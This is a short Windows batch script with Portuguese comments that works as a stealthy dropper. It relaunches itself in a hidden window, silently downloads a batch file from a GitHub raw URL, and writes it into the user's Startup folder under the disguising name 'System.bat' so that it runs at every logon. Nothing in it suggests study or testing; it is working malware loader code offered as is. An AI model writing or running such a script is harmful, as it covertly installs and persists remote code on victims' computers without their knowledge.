@echo off


:: Reexecuta o próprio script oculto
if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden"
    exit
)

:: URL do .exe
set "URL=https://github.com/lcmandrikion-hash/LZX/raw/refs/heads/main/LXZ.bat"

:: Caminho da pasta Startup
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\System.bat"

:: Baixa o arquivo
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%STARTUP%'"
